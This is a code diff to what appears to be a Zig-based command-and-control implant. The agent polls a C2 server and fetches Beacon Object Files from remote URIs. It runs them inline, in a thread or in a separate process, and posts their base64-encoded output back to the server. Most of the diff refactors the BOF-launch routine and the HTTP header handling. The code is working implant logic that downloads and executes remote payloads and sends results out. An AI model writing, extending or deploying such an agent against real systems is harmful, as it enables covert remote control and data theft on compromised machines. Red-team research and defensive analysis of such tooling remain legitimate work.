@@ -15,7 +15,7 @@ const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
 fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]const u8 {
-    var headers = std.http.Headers{ .allocator = allocator };
+    var headers = std.http.Headers.init(allocator);
     defer headers.deinit();
 
     var http_client: std.http.Client = .{
@@ -84,18 +84,7 @@ const State = struct {
         const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
         const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
-        var heartbeat_header = std.http.Headers{ .allocator = allocator };
-
-        const http_client: std.http.Client = .{
-            .allocator = allocator,
-            .http_proxy = if (debug_proxy_enabled) .{
-                .allocator = allocator,
-                .headers = heartbeat_header,
-                .protocol = .plain,
-                .host = debug_proxy_host,
-                .port = debug_proxy_port,
-            } else null,
-        };
+        var heartbeat_header = std.http.Headers.init(allocator);
 
         {
             const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
@@ -112,6 +101,17 @@ const State = struct {
             _ = std.base64.Base64Encoder.encode(&base64_encoder, authz_b64, authz);
             try heartbeat_header.append("Authorization", authz_b64);
         }
+
+        const http_client: std.http.Client = .{
+            .allocator = allocator,
+            .http_proxy = if (debug_proxy_enabled) .{
+                .allocator = allocator,
+                .headers = heartbeat_header,
+                .protocol = .plain,
+                .host = debug_proxy_host,
+                .port = debug_proxy_port,
+            } else null,
+        };
 
         return State{
             .base64_decoder = base64_decoder,
@@ -133,6 +133,66 @@ const PendingBof = struct {
     context: *bof.Context,
     request_id: []const u8,
 };
+
+fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.json.Value) !void {
+    const request_id = root.object.get("id").?.string;
+
+    const bof_args = if (root.object.get("args")) |value| bof_args: {
+        const len = try state.base64_decoder.calcSizeForSlice(value.string);
+        const bof_args = try allocator.alloc(u8, len);
+        errdefer allocator.free(bof_args);
+        _ = try state.base64_decoder.decode(bof_args, value.string);
+        break :bof_args bof_args;
+    } else null;
+    defer if (bof_args) |args| allocator.free(args);
+
+    const bof_path = root.object.get("path").?.string;
+
+    // fetch bof content
+    const bof_content = try fetchBofContent(allocator, bof_path);
+    defer allocator.free(bof_content);
+
+    const bof_object = try bof.Object.initFromMemory(bof_content);
+    errdefer bof_object.release();
+
+    // process header
+    const bof_header = root.object.get("header").?.string;
+    var iter_hdr = std.mem.tokenize(u8, bof_header, ":");
+    const exec_mode = iter_hdr.next() orelse return error.BadData;
+    //TODO: handle 'buffers'
+    //const args_spec = iter_hdr.next() orelse return error.BadData;
+
+    var bof_context: ?*bof.Context = null;
+
+    if (std.mem.eql(u8, exec_mode, "inline")) {
+        std.log.info("Execution mode: {s}-based", .{exec_mode});
+
+        bof_context = try bof_object.run(@constCast(bof_args));
+    } else if (std.mem.eql(u8, exec_mode, "thread")) {
+        std.log.info("Execution mode: {s}-based", .{exec_mode});
+
+        bof_context = try bof_object.runAsyncThread(
+            @constCast(bof_args),
+            null,
+            null,
+        );
+    } else if (std.mem.eql(u8, exec_mode, "process")) {
+        std.log.info("Execution mode: {s}-based", .{exec_mode});
+
+        bof_context = try bof_object.runAsyncProcess(
+            @constCast(bof_args),
+            null,
+            null,
+        );
+    }
+
+    if (bof_context) |context| {
+        try state.pending_bofs.append(.{
+            .context = context,
+            .request_id = try allocator.dupe(u8, request_id),
+        });
+    } else bof_object.release();
+}
 
 fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
     // send heartbeat to C2 and check if any tasks are pending
@@ -159,6 +219,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
     if (std.ascii.eqlIgnoreCase(content_type, "application/json")) {
         const resp_content = try allocator.alloc(u8, @intCast(req.response.content_length.?));
         defer allocator.free(resp_content);
+
         _ = try req.readAll(resp_content);
 
         var parsed = try std.json.parseFromSlice(std.json.Value, allocator, resp_content, .{});
@@ -169,74 +230,25 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
         // cmd - execute builtin command (like: sleep 10)
         var root = parsed.value;
         const task = root.object.get("name").?.string;
-
         const request_id = root.object.get("id").?.string;
 
         var iter_task = std.mem.tokenize(u8, task, ":");
         const cmd_prefix = iter_task.next() orelse return error.BadData;
         const cmd_name = iter_task.next() orelse return error.BadData;
 
-        // tasked to execute bof?
         if (std.mem.eql(u8, cmd_prefix, "bof")) {
             std.log.info("Executing bof: {s}", .{cmd_name});
 
-            const bof_args = if (root.object.get("args")) |value| bof_args: {
-                const len = try state.base64_decoder.calcSizeForSlice(value.string);
-                const bof_args = try allocator.alloc(u8, len);
-                errdefer allocator.free(bof_args);
-                _ = try state.base64_decoder.decode(bof_args, value.string);
-                break :bof_args bof_args;
-            } else null;
-            defer if (bof_args) |args| allocator.free(args);
-
-            const bof_path = root.object.get("path").?.string;
-
-            // fetch bof content
-            const bof_content = try fetchBofContent(allocator, bof_path);
-            defer allocator.free(bof_content);
-
-            const bof_object = try bof.Object.initFromMemory(bof_content);
-            errdefer bof_object.release();
-
-            // process header
-            const bof_header = root.object.get("header").?.string;
-            var iter_hdr = std.mem.tokenize(u8, bof_header, ":");
-            const exec_mode = iter_hdr.next() orelse return error.BadData;
-            //TODO: handle 'buffers'
-            //const args_spec = iter_hdr.next() orelse return error.BadData;
-
-            var bof_context: ?*bof.Context = null;
-
-            if (std.mem.eql(u8, exec_mode, "inline")) {
-                std.log.info("Execution mode: {s}-based", .{exec_mode});
-
-                bof_context = try bof_object.run(@constCast(bof_args));
-            } else if (std.mem.eql(u8, exec_mode, "thread")) {
-                std.log.info("Execution mode: {s}-based", .{exec_mode});
-
-                bof_context = try bof_object.runAsyncThread(
-                    @constCast(bof_args),
-                    null,
-                    null,
-                );
-            } else if (std.mem.eql(u8, exec_mode, "process")) {
-                std.log.info("Execution mode: {s}-based", .{exec_mode});
-
-                bof_context = try bof_object.runAsyncProcess(
-                    @constCast(bof_args),
-                    null,
-                    null,
-                );
-            }
-
-            if (bof_context) |context| {
-                try state.pending_bofs.append(.{
-                    .context = context,
-                    .request_id = try allocator.dupe(u8, request_id),
-                });
-            } else bof_object.release();
-
-            // tasked to execute builtin command?
+            receiveAndLaunchBof(allocator, state, root) catch {
+                var options = std.http.Client.FetchOptions{
+                    .location = .{ .uri = state.heartbeat_uri },
+                    .response_strategy = .none,
+                };
+                try options.headers.append("Authorization", request_id);
+                try options.headers.append("user-agent", "1"); // error code
+                var result = try state.http_client.fetch(allocator, options);
+                defer result.deinit();
+            };
         } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
             std.log.info("Executing builtin command: {s}", .{cmd_name});
         }
@@ -258,21 +270,21 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
 
                 const out_b64 = try allocator.alloc(u8, state.base64_encoder.calcSize(output.len));
                 defer allocator.free(out_b64);
+
                 _ = state.base64_encoder.encode(out_b64, output);
 
-                var h = std.http.Headers{ .allocator = allocator };
-                defer h.deinit();
-                try h.append("content-type", "text/plain");
-                try h.append("Authorization", pending_bof.request_id);
+                var headers = std.http.Headers.init(allocator);
+                defer headers.deinit();
+                try headers.append("content-type", "text/plain");
+                try headers.append("Authorization", pending_bof.request_id);
 
-                var reqRes = try state.http_client.open(.POST, state.heartbeat_uri, h, .{});
-                defer reqRes.deinit();
+                var request = try state.http_client.open(.POST, state.heartbeat_uri, headers, .{});
+                defer request.deinit();
+                request.transfer_encoding = .{ .content_length = out_b64.len };
 
-                reqRes.transfer_encoding = .{ .content_length = out_b64.len };
-
-                try reqRes.send(.{});
-                try reqRes.writeAll(out_b64);
-                try reqRes.finish();
+                try request.send(.{});
+                try request.writeAll(out_b64);
+                try request.finish();
             }
 
             context.getObject().release();
